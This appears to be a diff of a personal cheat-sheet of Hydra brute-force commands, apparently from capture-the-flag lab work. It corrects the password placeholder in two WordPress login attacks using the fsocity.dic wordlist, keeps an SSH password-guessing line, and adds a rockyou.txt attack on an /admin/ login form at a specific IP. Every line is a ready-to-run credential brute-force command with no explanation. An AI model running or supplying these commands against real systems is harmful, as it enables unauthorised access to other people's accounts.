@@ -1,5 +1,8 @@
-hydra -L fsocity.dic -p test <victim ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid " -t 30
+hydra -L fsocity.dic -p test <victim ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid " -t 30
 
-hydra -l Elliot -P fsocity.dic <victim ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid" -t 30 
+hydra -l Elliot -P fsocity.dic <victim ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:Invalid" -t 30 
+
 
 hydra -l think -P /home/mystic/Downloads/test/htb/password.txt <victim ip> ssh
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.181.17 http-post-form "/admin/:user=admin&pass=^PASS^:Invalid"
